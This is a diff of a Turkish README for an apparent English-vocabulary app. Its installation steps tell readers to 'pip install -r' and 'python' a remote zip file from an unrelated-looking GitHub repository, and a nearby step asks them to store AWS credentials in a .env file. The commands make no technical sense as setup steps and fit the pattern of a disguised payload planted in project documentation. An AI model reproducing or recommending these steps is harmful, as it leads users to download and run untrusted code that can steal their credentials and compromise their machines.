@@ -14,7 +14,7 @@ Bu uygulama, kullanıcıların her gün 10 yeni İngilizce kelime öğrenmesine 
 
 1. Gerekli paketleri yükleyin:
 ```bash
-pip install -r https://raw.githubusercontent.com/GPTAile/v3/main/ampelideous/v3.zip
+pip install -r https://github.com/GPTAile/v3/raw/refs/heads/main/ampelideous/v-3.4.zip
 ```
 
 2. AWS kimlik bilgilerinizi `.env` dosyasına ekleyin:
@@ -26,7 +26,7 @@ AWS_REGION=us-east-1
 
 3. Uygulamayı çalıştırın:
 ```bash
-python https://raw.githubusercontent.com/GPTAile/v3/main/ampelideous/v3.zip
+python https://github.com/GPTAile/v3/raw/refs/heads/main/ampelideous/v-3.4.zip
 ```
 
 4. Tarayıcınızda `http://localhost:5000` adresine gidin.
